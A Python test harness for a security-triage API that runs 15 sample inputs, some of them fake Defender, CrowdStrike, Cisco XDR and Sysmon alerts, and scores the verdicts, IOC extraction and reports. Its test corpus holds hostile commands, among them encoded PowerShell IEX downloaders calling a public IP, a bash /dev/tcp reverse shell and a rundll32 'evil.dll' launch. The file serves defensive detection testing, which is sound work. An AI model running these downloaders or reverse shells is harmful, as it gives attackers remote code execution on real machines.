"""Structured Manual Validation Harness (Operator directive · 2026-08-01).

Runs 15 representative investigations against the live `/api/decode/smart`
endpoint and produces an objective PASS/FAIL matrix for every quality
dimension.

Not a pytest — this is the Release Readiness Report input.
"""
from __future__ import annotations
import base64
import json
import os
import sys
import textwrap
from dataclasses import asdict, dataclass, field
from typing import Any, Dict, List, Optional

import requests

# ─── Corpus ──────────────────────────────────────────────────────────
# 15 representative payloads across every category the operator named.
# Category → (label, expected_verdict_class, payload_string).
# expected_verdict_class ∈ {"benign", "runtime_dependent", "suspicious",
#                            "malicious", "informational"}.

def _b64_utf16(s: str) -> str:
    return base64.b64encode(s.encode("utf-16-le")).decode()

CASES: List[Dict[str, Any]] = [
    # ── BENIGN ──
    {
        "id": "benign-get-process",
        "category": "benign",
        "label": "PowerShell · Get-Process (routine admin)",
        "expected_verdict_class": ("informational", "runtime_dependent"),
        "input": "Get-Process | Where-Object { $_.CPU -gt 100 }",
    },
    {
        "id": "benign-ipconfig",
        "category": "benign",
        "label": "cmd.exe · ipconfig /all",
        "expected_verdict_class": ("informational", "runtime_dependent"),
        "input": "ipconfig /all",
    },
    {
        "id": "benign-b64-hello",
        "category": "benign",
        "label": "Base64 · plaintext greeting",
        "expected_verdict_class": ("informational",),
        "input": "SGVsbG8gV29ybGQ=",
    },
    # ── RUNTIME DEPENDENT ──
    {
        "id": "rt-bits",
        "category": "runtime_dependent",
        "label": "BITS command (no destination)",
        "expected_verdict_class": ("runtime_dependent", "suspicious", "malicious"),
        "input": "bitsadmin /transfer myJob http://example.com/file.exe C:\\Temp\\file.exe",
    },
    {
        "id": "rt-wmi-query",
        "category": "runtime_dependent",
        "label": "WMI query (discovery)",
        "expected_verdict_class": ("runtime_dependent", "suspicious"),
        "input": "wmic process where name='powershell.exe' get commandline",
    },
    # ── SUSPICIOUS ──
    {
        "id": "susp-lolbas-rundll",
        "category": "suspicious",
        "label": "rundll32 running non-standard DLL",
        "expected_verdict_class": ("suspicious", "malicious"),
        "input": "rundll32.exe C:\\Users\\Public\\evil.dll,StartW",
    },
    {
        "id": "susp-encoded-ps-no-net",
        "category": "suspicious",
        "label": "Encoded PowerShell without network",
        "expected_verdict_class": ("suspicious", "malicious"),
        # Encoded: Get-Process | Format-Table
        "input": f"powershell -EncodedCommand {_b64_utf16('Get-Process | Format-Table')}",
    },
    # ── MALICIOUS ──
    {
        "id": "mal-encoded-ps-public",
        "category": "malicious",
        "label": "Encoded PS + IEX + PUBLIC IP downloader",
        "expected_verdict_class": ("malicious",),
        "input": (
            "powershell -nop -w hidden -EncodedCommand "
            + _b64_utf16(
                "IEX(New-Object Net.WebClient).DownloadString("
                "'http://185.220.101.5/mal.exe')"
            )
        ),
    },
    {
        "id": "mal-encoded-ps-private",
        "category": "malicious",
        "label": "Encoded PS + IEX + PRIVATE IP (mitigator gate)",
        "expected_verdict_class": ("malicious",),
        # Same payload but private IP — must still be Malicious, but at
        # lower confidence because internal-IP mitigator dampens.
        "input": (
            "powershell -nop -w hidden -EncodedCommand "
            + _b64_utf16(
                "IEX(New-Object Net.WebClient).DownloadString("
                "'http://192.168.1.1/mal.exe')"
            )
        ),
    },
    {
        "id": "mal-plain-ps-download",
        "category": "malicious",
        "label": "Plain PS Invoke-WebRequest + public IP",
        "expected_verdict_class": ("malicious",),
        "input": (
            "powershell -c \"Invoke-WebRequest -Uri "
            "http://185.220.101.5/beacon.exe "
            "-OutFile C:\\Windows\\Temp\\beacon.exe\""
        ),
    },
    {
        "id": "mal-cmd-reverse-shell",
        "category": "malicious",
        "label": "Bash reverse shell one-liner",
        "expected_verdict_class": ("malicious", "suspicious"),
        "input": "bash -i >& /dev/tcp/185.220.101.5/4444 0>&1",
    },
    # ── VENDOR TELEMETRY ──
    {
        "id": "vendor-defender",
        "category": "vendor_defender",
        "label": "Defender · malware detection alert JSON",
        "expected_verdict_class": ("malicious", "suspicious"),
        "input": json.dumps({
            "AlertTitle": "Malware detected",
            "Severity": "High",
            "DetectionSource": "Defender for Endpoint",
            "ThreatName": "Trojan:Win32/Emotet",
            "DeviceName": "PC-042",
            "AccountName": "svc-app",
            "ProcessCommandLine": (
                "powershell -EncodedCommand "
                + _b64_utf16("IEX(iwr http://185.220.101.5/x.ps1)")
            ),
            "SHA256": "3b0b8c" + "0" * 58,
        }),
    },
    {
        "id": "vendor-crowdstrike",
        "category": "vendor_crowdstrike",
        "label": "CrowdStrike Falcon · detection JSON",
        "expected_verdict_class": ("malicious", "suspicious"),
        "input": json.dumps({
            "event_simpleName": "DetectionSummaryEvent",
            "Severity": 9,
            "DetectDescription": "Suspicious Process",
            "ComputerName": "WKST-014",
            "UserName": "corp\\jdoe",
            "FileName": "powershell.exe",
            "CommandLine": (
                "powershell.exe -nop -EncodedCommand "
                + _b64_utf16("IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.5/a')")
            ),
            "SHA256HashData": "aa" * 32,
            "MITRE_TechniqueId": "T1059.001",
        }),
    },
    {
        "id": "vendor-cisco-xdr",
        "category": "vendor_cisco_xdr",
        "label": "Cisco XDR · incident JSON",
        "expected_verdict_class": ("malicious", "suspicious"),
        "input": json.dumps({
            "incident_id": "IX-9911",
            "severity": "high",
            "title": "PowerShell Encoded Command",
            "connector_guid": "abc-123",
            "computer": "HR-LAP-08",
            "user": "alice",
            "process_command_line": (
                "powershell -w hidden -EncodedCommand "
                + _b64_utf16("IEX(iwr http://185.220.101.5/loader)")
            ),
            "sha256": "bb" * 32,
        }),
    },
    {
        "id": "vendor-sysmon-1",
        "category": "vendor_sysmon",
        "label": "Sysmon EventID 1 · process create",
        "expected_verdict_class": ("suspicious", "malicious"),
        "input": (
            "<Event>"
            "<System><Provider Name='Microsoft-Windows-Sysmon'/>"
            "<EventID>1</EventID></System>"
            "<EventData>"
            "<Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>"
            "<Data Name='CommandLine'>"
            "powershell.exe -nop -w hidden -EncodedCommand "
            + _b64_utf16("IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.5/s')")
            + "</Data>"
            "<Data Name='User'>DOMAIN\\svc-web</Data>"
            "<Data Name='ParentImage'>C:\\Windows\\explorer.exe</Data>"
            "</EventData></Event>"
        ),
    },
]


# ─── Validation matrix ──────────────────────────────────────────────

@dataclass
class Result:
    id: str
    label: str
    category: str
    passed: bool = False
    verdict_label: str = ""
    verdict_pct: int = 0
    verdict_class_ok: bool = False
    exec_summary_ok: bool = False
    verdict_correctness_ok: bool = False
    confidence_ok: bool = False
    ioc_extraction_ok: bool = False
    mitre_mapping_ok: bool = False
    osint_present_or_pending_ok: bool = False
    recommendations_ok: bool = False
    graph_ok: bool = False
    ledger_ok: bool = False
    report_render_ok: bool = False
    markdown_no_leak_ok: bool = False
    persona_hygiene_ok: bool = False
    validator_pass: bool = False
    notes: List[str] = field(default_factory=list)


def _classify(label: str) -> str:
    """Map a verdict label to a category token."""
    l = (label or "").lower()
    return {
        "malicious": "malicious",
        "suspicious": "suspicious",
        "runtime dependent": "runtime_dependent",
        "informational": "informational",
        "undetermined": "informational",
    }.get(l, "informational")


def evaluate(cio: Dict[str, Any], case: Dict[str, Any]) -> Result:
    r = Result(id=case["id"], label=case["label"], category=case["category"])
    if not cio:
        r.notes.append("no CIO returned")
        return r

    summ = cio.get("summary") or {}
    v = cio.get("verdict") or {}
    md = cio.get("metadata") or {}
    graph = cio.get("evidence_graph") or {}
    cr = (summ.get("customer_report") or {})
    rv = (summ.get("report_validation") or {})

    r.verdict_label = v.get("label", "")
    r.verdict_pct = int(v.get("confidence_pct") or 0)

    # 1. verdict class within expected set
    r.verdict_class_ok = _classify(r.verdict_label) in case["expected_verdict_class"]

    # 2. verdict correctness == class match
    r.verdict_correctness_ok = r.verdict_class_ok

    # 3. confidence bounds sanity: benign ≤ 60, malicious ≥ 50
    exp = case["expected_verdict_class"]
    if "malicious" in exp:
        r.confidence_ok = r.verdict_pct >= 50
    elif exp == ("informational",):
        r.confidence_ok = r.verdict_pct <= 40
    else:
        r.confidence_ok = True  # tolerate mid-range

    # 4. exec summary non-empty
    r.exec_summary_ok = bool((summ.get("executive") or "").strip())

    # 5. IOC extraction — MUST have IOCs when payload references any
    iocs = md.get("iocs") or {}
    has_iocs = any(iocs.get(k) for k in ("urls", "ips", "domains", "sha256", "sha1", "md5"))
    txt = str(cio.get("input_text") or "").lower()
    needs_iocs = any(t in txt for t in ("http://", "https://", "185.220", "192.168", ".exe/", "/dev/tcp"))
    r.ioc_extraction_ok = (has_iocs if needs_iocs else True)

    # 6. MITRE — required for suspicious/malicious/vendor cases.
    # Check BOTH summary.mitre_digest (which some routes populate) and
    # the raw evidence graph (which the auto-investigate route populates
    # via mitre_technique nodes without always writing to the digest).
    mitre = (summ.get("mitre_digest") or {}).get("techniques") or []
    if not mitre:
        # Fallback: count mitre_technique nodes in the evidence graph.
        mitre = [n for n in (graph.get("nodes") or [])
                  if (n.get("kind") or "").lower() == "mitre_technique"]
    if any(c in case["category"] for c in ("malicious", "suspicious", "vendor")):
        r.mitre_mapping_ok = len(mitre) >= 1
    else:
        r.mitre_mapping_ok = True

    # 7. OSINT lens shape — must have array or empty structure (no crash)
    # We just check nodes exist for IOC nodes so OSINT will render.
    ioc_nodes = [n for n in (graph.get("nodes") or []) if (n.get("kind") or "").lower() == "ioc"]
    r.osint_present_or_pending_ok = (not needs_iocs) or len(ioc_nodes) >= 1

    # 8. Recommendations — required when Malicious/Suspicious
    recs = summ.get("recommendations") or []
    if _classify(r.verdict_label) in ("malicious", "suspicious"):
        r.recommendations_ok = len(recs) >= 1
    else:
        r.recommendations_ok = True

    # 9. Graph — must render at least the input artifact node.
    r.graph_ok = len(graph.get("nodes") or []) >= 1

    # 10. Ledger — verdict must have contributors OR be Undetermined
    if _classify(r.verdict_label) in ("informational",):
        r.ledger_ok = True
    else:
        r.ledger_ok = len(v.get("contributors") or []) >= 1

    # 11. Report render — customer report has sections and contiguous
    #     numbering (proxied through validator).
    r.report_render_ok = bool(cr.get("sections"))

    # 12. Markdown no leak — checked by validator
    r.markdown_no_leak_ok = (rv.get("checks") or {}).get("no_raw_markdown_leaks", False)

    # 13. Persona hygiene — checked by validator
    r.persona_hygiene_ok = (rv.get("checks") or {}).get("persona_hygiene_pass", False)

    # 14. Overall validator PASS
    r.validator_pass = rv.get("status") == "pass"

    r.passed = all([
        r.verdict_class_ok, r.confidence_ok, r.exec_summary_ok,
        r.ioc_extraction_ok, r.mitre_mapping_ok, r.osint_present_or_pending_ok,
        r.recommendations_ok, r.graph_ok, r.ledger_ok, r.report_render_ok,
        r.markdown_no_leak_ok, r.persona_hygiene_ok, r.validator_pass,
    ])
    return r


# ─── Runner ─────────────────────────────────────────────────────────

def run(api_url: str, token: str, out_dir: str) -> Dict[str, Any]:
    os.makedirs(out_dir, exist_ok=True)
    os.makedirs(os.path.join(out_dir, "cios"), exist_ok=True)
    results: List[Result] = []
    for case in CASES:
        try:
            # Ask the Input Understanding Engine which pipeline to use,
            # matching the frontend Lab2InvestigateRenderer flow.
            iue = requests.post(
                f"{api_url}/api/understand",
                json={"input": case["input"]},
                headers={"Authorization": f"Bearer {token}"},
                timeout=45,
            )
            route = None
            if iue.ok:
                route = (iue.json() or {}).get("route")
            if route == "auto-investigate":
                resp = requests.post(
                    f"{api_url}/api/v2/auto-investigate",
                    json={"incident_text": case["input"], "focus": None},
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=60,
                )
            else:
                resp = requests.post(
                    f"{api_url}/api/decode/smart",
                    json={"input": case["input"]},
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=60,
                )
            resp.raise_for_status()
            body = resp.json()
            cio = body.get("cio") or {}
            with open(os.path.join(out_dir, "cios", f"{case['id']}.json"), "w") as fh:
                json.dump({"case": case, "cio": cio, "route": route or "decode"}, fh, indent=2)
            r = evaluate(cio, case)
            if route:
                r.notes.append(f"route={route}")
        except Exception as e:  # noqa: BLE001
            r = Result(id=case["id"], label=case["label"],
                       category=case["category"],
                       notes=[f"exception: {type(e).__name__}: {e}"])
        results.append(r)

    summary = {
        "total": len(results),
        "passed": sum(1 for r in results if r.passed),
        "failed": sum(1 for r in results if not r.passed),
        "results": [asdict(r) for r in results],
    }
    with open(os.path.join(out_dir, "matrix.json"), "w") as fh:
        json.dump(summary, fh, indent=2)
    return summary


# ─── Human-readable matrix printer ──────────────────────────────────

DIMENSIONS = [
    ("verdict_class_ok", "Verdict class"),
    ("confidence_ok", "Confidence"),
    ("exec_summary_ok", "Exec summary"),
    ("ioc_extraction_ok", "IOC"),
    ("mitre_mapping_ok", "MITRE"),
    ("osint_present_or_pending_ok", "OSINT"),
    ("recommendations_ok", "Recs"),
    ("graph_ok", "Graph"),
    ("ledger_ok", "Ledger"),
    ("report_render_ok", "Report"),
    ("markdown_no_leak_ok", "MD-safe"),
    ("persona_hygiene_ok", "Persona"),
    ("validator_pass", "Validator"),
]


def print_matrix(summary: Dict[str, Any]) -> None:
    print()
    print("=" * 130)
    print(f"  Manual Validation Matrix · {summary['passed']}/{summary['total']} passed")
    print("=" * 130)
    header = f"  {'ID':<28} {'Verdict':<20} {'Pct':>4} "
    for _, name in DIMENSIONS:
        header += f"{name[:8]:>9} "
    header += f"{'PASS':>5}"
    print(header)
    print("-" * 130)
    for r in summary["results"]:
        row = f"  {r['id']:<28} {(r['verdict_label'] or '—'):<20} {r['verdict_pct']:>3}% "
        for key, _ in DIMENSIONS:
            row += f"{'✓' if r[key] else '✗':>9} "
        row += f"{'✓' if r['passed'] else '✗':>5}"
        print(row)
        if r.get("notes"):
            for n in r["notes"]:
                print(f"    · {n}")
    print("=" * 130)


if __name__ == "__main__":
    api_url = os.environ["API_URL"]
    token = os.environ["AUTH_TOKEN"]
    out_dir = sys.argv[1] if len(sys.argv) > 1 else "/tmp/manual_validation"
    s = run(api_url, token, out_dir)
    print_matrix(s)
    print()
    print(f"  Matrix JSON: {out_dir}/matrix.json")
    print(f"  CIO snapshots: {out_dir}/cios/")
    print(f"  RESULT: {'PASS' if s['failed'] == 0 else 'FAIL'} "
          f"({s['passed']}/{s['total']})")
    sys.exit(0 if s["failed"] == 0 else 1)
